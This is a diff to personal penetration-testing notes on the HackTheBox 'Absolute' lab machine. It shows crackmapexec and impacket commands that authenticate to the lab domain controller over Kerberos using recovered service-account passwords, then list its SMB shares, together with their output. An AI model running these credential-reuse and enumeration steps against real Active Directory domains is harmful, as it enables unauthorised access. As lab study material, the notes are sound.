@@ -1,3 +1,5 @@
+* https://0xdf.gitlab.io/2023/05/27/htb-absolute.html
+
 # Auth as d.klay
 ### Get Username List
 ```bash
@@ -206,4 +208,73 @@ LDAP        10.129.229.59   389    DC               winrm_user                  
 faketime '2023-11-20 19:16:00' crackmapexec smb $IP -u svc_smb -p 'AbsoluteSMBService123!' -k
 SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!
+
+faketime '2023-11-20 22:28:00' crackmapexec smb $IP -u svc_smb -p 'AbsoluteSMBService123!' -k --shares
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
+SMB         10.129.229.59   445    DC               [+] Enumerated shares
+SMB         10.129.229.59   445    DC               Share           Permissions     Remark
+SMB         10.129.229.59   445    DC               -----           -----------     ------
+SMB         10.129.229.59   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.229.59   445    DC               C$                              Default share
+SMB         10.129.229.59   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.229.59   445    DC               Shared          READ            
+SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share
+```
+
+# Auth as m.lovegod
+### Enum
+##### Bloodhound
+Mark `svc_smb` owned, Unfortunately, the permissions are the same as d.klay.
+
+##### Method 1, Impacket-Smbclient via TGT instead of kinit
+Again, it's better since it doesn't need to config the `/etc/krb5.conf`
+
+```bash
+faketime '2023-11-20 20:13:00' impacket-getTGT absolute.htb/svc_smb:AbsoluteSMBService123! -dc-ip dc.absolute.htb
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Saving ticket in svc_smb.ccache
+export KRB5CCNAME=svc_smb.ccache
+
+faketime '2023-11-20 20:13:00' impacket-smbclient 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k
+faketime '2023-11-20 19:44:00' impacket-smbclient 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k -no-pass
+
+# use Shared
+# ls
+drw-rw-rw-          0  Fri Sep  2 05:02:23 2022 .
+drw-rw-rw-          0  Fri Sep  2 05:02:23 2022 ..
+-rw-rw-rw-         72  Fri Sep  2 05:02:23 2022 compiler.sh
+-rw-rw-rw-      67584  Fri Sep  2 05:02:23 2022 test.exe
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+Shared
+SYSVOL
+
+```
+
+##### Method 2, Smbclient
+* https://unix.stackexchange.com/questions/722817/the-kerberos-option-is-deprecated-on-smbclient-but-is-the-only-option-working
+
+I tried to make it work but gave up in the end.
+
+```bash
+faketime '2023-11-20 20:10:00' smbclient -L //absolute.htb -U 'svc_smb@absolute.htb%AbsoluteSMBService123!' --use-kerberos=required --use-krb5-ccache=svc_smb.ccache
+gensec_spnego_client_negTokenInit_step: gse_krb5: creating NEG_TOKEN_INIT for cifs/absolute.htb failed (next[(null)]): NT_STATUS_INVALID_PARAMETER
+session setup failed: NT_STATUS_INVALID_PARAMETER
+```
+
+### Moving on windows
+I didn't do that.
+* https://0xdf.gitlab.io/2023/05/27/htb-absolute.html#dynamic-analysis
+
+### CME to Verify it
+```bash
+faketime '2023-11-20 22:34:00' crackmapexec smb $IP -u m.lovegod -p 'AbsoluteLDAP2022!' -k
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.59   445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
 ```
